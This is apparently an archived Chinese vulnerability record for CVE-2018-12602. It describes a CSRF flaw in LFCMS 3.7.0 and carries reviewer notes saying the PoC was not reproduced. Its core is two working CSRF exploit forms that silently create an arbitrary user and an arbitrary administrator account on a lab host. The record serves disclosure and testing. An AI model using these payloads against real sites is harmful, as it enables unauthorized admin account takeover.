---
cve: "CVE-2018-12602"
source: "Mr-xn/Penetration_Testing_POC"
product: "LFCMS3.7.0"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-12602"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "LFCMS 3.7.0存在CSRF漏洞可添加任意用户账户或任意管理员账户2"
prerequisites: "来源所述条件，未列明部分仍待核：已登录有新增用户/管理账号权限受害者，手动Submit，跨站凭证"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-155d86a3297fdf1fcad6bfb3"
entity_id: "ve-155d86a3297fdf1fcad6bfb3"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：已登录有新增用户/管理账号权限受害者，手动Submit，跨站凭证

- **适用与权限边界（1）**：标题两账户类型，两个不同Users/Member接口应分别记录条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（2）**：概述漏已登录管理员前提；表单不自动提交，未给服务器响应/版本修复。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（3）**：作者日期CVE出处可保留；不要只因同CVE将两接口删一个。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# LFCMS 3.7.0存在CSRF漏洞可添加任意用户账户或任意管理员账户2

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|LFCMS 3.7.0存在CSRF漏洞可添加任意用户账户或任意管理员账户|2018-06-20|Bay0net|[http://www.lfdycms.com/](http://www.lfdycms.com/) | [http://www.lfdycms.com/](http://www.lfdycms.com/) |3.7.0| [CVE-2018-12602](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12602)|  

#### 漏洞概述  

> 攻击者可通过构造 CSRF 请求，来新增任意用户。   

### POC实现代码如下：  

> 通过CSRF增加任意用户 的exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Users/add.html" method="POST">
      <input type="hidden" name="username" value="test222" />
      <input type="hidden" name="email" value="test2@qq.com" />
      <input type="hidden" name="password" value="test222" />
      <input type="hidden" name="repassword" value="test222" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
> 通过CSRF增加管理员用户 的exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html" method="POST">
      <input type="hidden" name="username" value="admin2" />
      <input type="hidden" name="password" value="admin2" />
      <input type="hidden" name="repassword" value="admin2" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
